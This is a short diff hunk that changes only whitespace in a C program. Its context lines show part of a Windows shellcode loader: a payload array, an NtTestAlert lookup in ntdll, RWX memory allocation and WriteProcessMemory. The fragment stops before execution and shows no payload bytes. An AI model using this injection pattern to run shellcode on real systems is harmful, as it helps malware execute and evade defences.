@@ -41,7 +41,7 @@ unsigned char my_payload[] = {
 int main(int argc, char* argv[]) {
   SIZE_T my_payload_len = sizeof(my_payload);
   HMODULE hNtdll = GetModuleHandleA("ntdll");
-	myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(hNtdll, "NtTestAlert"));
+  myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(hNtdll, "NtTestAlert"));
 
   LPVOID my_payload_mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   WriteProcessMemory(GetCurrentProcess(), my_payload_mem, my_payload, my_payload_len, NULL);
